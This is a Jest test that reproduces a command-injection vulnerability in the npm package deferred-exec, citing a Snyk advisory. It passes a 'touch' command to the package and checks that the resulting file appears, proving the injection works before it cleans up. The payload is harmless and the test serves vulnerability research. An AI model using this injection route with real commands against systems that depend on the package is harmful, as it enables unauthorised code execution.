//https://snyk.io/vuln/SNYK-JS-DEFERREDEXEC-1050433
test("Command Injection in deferred-exec", () => 
{
	const a = require("deferred-exec");
	const fs = require('fs')
	const path = './deferred-exec'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	a(" touch deferred-exec ",{});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
